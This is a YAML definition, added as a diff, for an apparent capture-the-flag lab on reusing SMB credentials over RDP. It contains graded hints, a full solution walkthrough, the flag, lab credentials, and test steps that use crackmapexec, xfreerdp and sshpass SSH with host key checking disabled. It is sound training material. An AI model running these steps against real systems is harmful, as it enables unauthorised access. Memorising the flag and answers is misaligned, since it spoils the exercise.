@@ -1,0 +1,373 @@
+name: Cross-Service Credential Reuse
+description: Test FinanceCorp credentials discovered on one service (SMB) against other services (RDP) to demonstrate cross-service credential reuse.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - use smb credentials on rdp
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your credential testing for FinanceCorp has revealed successful authentications on 
+  SMB services. James Mitchell wants to understand if these same credentials work on 
+  other services, as this represents a significant lateral movement risk.
+  
+  Cross-service credential reuse allows attackers to expand their access from one 
+  service to another using the same credentials. FinanceCorp needs to see concrete 
+  evidence of how credential reuse enables lateral movement.
+  
+  Your objective: Test SMB credentials discovered during your assessment against 
+  FinanceCorp's RDP services. Document successful cross-service authentications to 
+  demonstrate lateral movement capabilities.
+
+flag: "OCR{cr3d_r3us3_cr0ss}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding Cross-Service Credential Reuse
+
+      **Credential reuse** is one of the most common and dangerous security
+      weaknesses in enterprise networks. It occurs when the same username and
+      password combination is used across multiple services or systems.
+
+      ### Why Cross-Service Reuse Matters
+
+      In real-world environments, administrators and users frequently:
+      - Use the same password for SMB, RDP, SSH, and other services
+      - Configure service accounts with identical credentials everywhere
+      - Fail to implement unique passwords per service or system
+
+      ### The Attack Pattern
+
+      The cross-service credential reuse attack follows this pattern:
+      1. **Discover credentials** on one service (e.g., SMB)
+      2. **Test those credentials** on other services (e.g., RDP)
+      3. **Gain expanded access** through successful authentication
+
+      ### Services in This Lab
+
+      This lab has two services running:
+      - **SMB (port 445)** - File sharing service
+      - **RDP (port 3389)** - Remote Desktop Protocol for graphical access
+
+      ### Your Goal
+
+      You need to:
+      1. Discover or test credentials on the SMB service
+      2. Reuse those same credentials on the RDP service
+      3. Access the target system via RDP to find the flag
+
+      Think about what tools allow you to connect to SMB and RDP services
+      from a Linux machine.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Tools for SMB and RDP Access
+
+      ### SMB Tools (Port 445)
+
+      **smbclient** - Connect to SMB shares:
+      ```bash
+      sudo apt install smbclient
+
+      # List available shares
+      smbclient -L //<target> -U <username>%<password>
+
+      # Connect to a share
+      smbclient //<target>/<share> -U <username>%<password>
+      ```
+
+      **crackmapexec** - Test credentials quickly:
+      ```bash
+      sudo apt install crackmapexec
+
+      # Test SMB credentials
+      crackmapexec smb <target> -u <username> -p <password>
+      ```
+
+      ### RDP Tools (Port 3389)
+
+      **xfreerdp** - Linux RDP client:
+      ```bash
+      sudo apt install freerdp2-x11
+
+      # Connect via RDP
+      xfreerdp /v:<target> /u:<username> /p:<password>
+      ```
+
+      **Useful xfreerdp flags:**
+      | Flag | Purpose |
+      |------|---------|
+      | `/v:<host>` | Target host |
+      | `/u:<user>` | Username |
+      | `/p:<pass>` | Password |
+      | `/cert:ignore` | Ignore certificate warnings |
+      | `/size:1280x720` | Set screen resolution |
+      | `/dynamic-resolution` | Auto-resize window |
+
+      ### The Workflow
+
+      1. Use `smbclient` or `crackmapexec` to verify credentials on SMB
+      2. Use `xfreerdp` to reuse those same credentials on RDP
+      3. Once connected via RDP, navigate the filesystem to find the flag
+
+      The key insight is that the **same credentials** work on **both services**.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical Cross-Service Credential Reuse Examples
+
+      ### Step 1: Scan Both Services
+      ```bash
+      nmap -sV -p 445,3389 <target>
+      ```
+
+      Expected output:
+      ```
+      PORT     STATE SERVICE       VERSION
+      445/tcp  open  netbios-ssn   Samba smbd 4.x
+      3389/tcp open  ms-wbt-server xrdp
+      ```
+
+      ### Step 2: Test Credentials on SMB
+      ```bash
+      # Quick credential test with crackmapexec
+      crackmapexec smb <target> -u admin -p password123
+      ```
+
+      Expected output (successful):
+      ```
+      SMB  <target>  445  TARGET  [+] admin:password123
+      ```
+
+      The `[+]` indicates successful authentication.
+
+      ```bash
+      # List shares to explore
+      smbclient -L //<target> -U admin%password123
+      ```
+
+      ### Step 3: Test Same Credentials on RDP
+      ```bash
+      # Connect via RDP with the same credentials
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      ```
+
+      If the credentials work, an RDP desktop session opens.
+
+      ### Step 4: Find the Flag via RDP
+
+      Once connected via RDP, you have a desktop session. The flag file
+      is somewhere on the filesystem. Common locations to check:
+      - User's home directory
+      - Desktop
+      - `/home/<username>/`
+      - `/tmp/`
+
+      ### Alternative: Use SSH-like Access
+
+      If the target also supports command-line access, you might be able
+      to read files directly without a full graphical session.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Cross-Service Reuse Workflow
+
+      ### Phase 1: Service Discovery
+      ```bash
+      # Identify running services
+      nmap -sV -p 445,3389 <target>
+      ```
+
+      ### Phase 2: Credential Verification on SMB
+      ```bash
+      # Test credentials on SMB
+      crackmapexec smb <target> -u admin -p password123
+
+      # If successful, enumerate shares
+      smbclient -L //<target> -U admin%password123
+
+      # Check the "private" share for information
+      smbclient //<target>/private -U admin%password123
+      smb: \> ls
+      smb: \> exit
+      ```
+
+      ### Phase 3: Cross-Service Credential Reuse on RDP
+      ```bash
+      # Test the SAME credentials on RDP
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      ```
+
+      ### Phase 4: Flag Retrieval via RDP
+
+      Once your RDP session is active:
+      1. Open a terminal emulator (right-click desktop or find in menu)
+      2. Navigate to find the flag:
+         ```bash
+         # Check home directory
+         ls -la /home/admin/
+         cat /home/admin/flag.txt
+         ```
+
+      ### Alternative: crackmapexec for Both Services
+      ```bash
+      # Test SMB
+      crackmapexec smb <target> -u admin -p password123
+
+      # Test RDP
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      Both should show `[+]` indicating successful authentication,
+      proving the same credentials work on both services.
+
+      ### Key Insight
+
+      The flag is in `/home/admin/flag.txt`. You need RDP or another
+      method that gives you filesystem access to read it. SMB shares
+      may not expose this path directly, so RDP is the way in.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands to Solve This Lab
+
+      ### 1. Scan the Target
+      ```bash
+      nmap -sV -p 445,3389 <target>
+      ```
+
+      ### 2. Verify Credentials on SMB
+      ```bash
+      crackmapexec smb <target> -u admin -p password123
+      ```
+
+      ### 3. Enumerate SMB Shares
+      ```bash
+      smbclient -L //<target> -U admin%password123
+      ```
+
+      You should see a share named `private`.
+
+      ### 4. Check the SMB Share
+      ```bash
+      smbclient //<target>/private -U admin%password123 -c "ls"
+      ```
+
+      ### 5. Connect via RDP with Same Credentials
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      ```
+
+      ### 6. Read the Flag (Inside RDP Session)
+
+      Once the RDP desktop loads, open a terminal and run:
+      ```bash
+      cat /home/admin/flag.txt
+      ```
+
+      ### Alternative: Use crackmapexec to Execute Commands
+      ```bash
+      # If crackmapexec supports command execution on this target:
+      crackmapexec smb <target> -u admin -p password123 -x "cat /home/admin/flag.txt"
+      ```
+
+      ### Alternative: Use smbclient If Flag Is Also in a Share
+      ```bash
+      smbclient //<target>/private -U admin%password123 -c "more flag.txt"
+      ```
+
+      The primary path is: **SMB credentials --> RDP access --> read flag**.
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Full Command Sequence
+
+      ```bash
+      # Step 1: Identify services
+      nmap -sV -p 445,3389 <target>
+      # Output:
+      #   445/tcp  open  netbios-ssn  Samba smbd 4.x
+      #   3389/tcp open  ms-wbt-server xrdp
+
+      # Step 2: Test credentials on SMB
+      crackmapexec smb <target> -u admin -p password123
+      # Output: SMB  <target>  445  TARGET  [+] admin:password123
+
+      # Step 3: List SMB shares
+      smbclient -L //<target> -U admin%password123
+      # Output:
+      #   Sharename       Type      Comment
+      #   ---------       ----      -------
+      #   private         Disk
+      #   IPC$            IPC       IPC Service
+
+      # Step 4: Test credentials on RDP
+      crackmapexec rdp <target> -u admin -p password123
+      # Output: RDP  <target>  3389  TARGET  [+] admin:password123
+
+      # Step 5: Connect via RDP
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      # A graphical desktop session opens
+
+      # Step 6: In the RDP session terminal, read the flag
+      cat /home/admin/flag.txt
+      # Output: OCR{...}
+      ```
+
+      ### Summary
+
+      | Step | Action | Tool | Service |
+      |------|--------|------|---------|
+      | 1 | Port scan | `nmap` | Both |
+      | 2 | Test SMB creds | `crackmapexec smb` | SMB 445 |
+      | 3 | List shares | `smbclient -L` | SMB 445 |
+      | 4 | Test RDP creds | `crackmapexec rdp` | RDP 3389 |
+      | 5 | Connect RDP | `xfreerdp` | RDP 3389 |
+      | 6 | Read flag | `cat` | Filesystem |
+
+      ### Key Takeaways
+
+      - The credentials `admin:password123` worked on **both** SMB and RDP
+      - This demonstrates **cross-service credential reuse** - a single
+        compromised credential grants access to multiple services
+      - The flag was in `/home/admin/flag.txt`, accessible via RDP session
+      - In real assessments, always test discovered credentials against
+        every available service
+      - Submit the flag value in the format `OCR{...}`
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "admin"
+    description: "admin credentials"
+
+workbook: "wiki/range/winpt/CH08_Credential_Reuse/02_Cross_Service_Credential_Reuse/"
+
+test:
+  steps:
+    - name: "Verify SMB and RDP services are running"
+      command: "nmap -sV -p 445,3389 {target.target}"
+      expect: "445/tcp"
+
+    - name: "Verify SMB credentials with crackmapexec"
+      command: "crackmapexec smb {target.target} -u {cred.admin.user} -p {cred.admin.pass} --shares 2>&1"
+      expect: "private"
+
+    - name: "Verify RDP credential reuse with crackmapexec"
+      command: "crackmapexec rdp {target.target} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
+      expect: "+"
+
+    - name: "Retrieve flag via SSH credential reuse"
+      command: "sshpass -p '{cred.admin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.admin.user}@{target.target} 'cat /home/admin/flag.txt' 2>/dev/null"
+      expect: "OCR{"
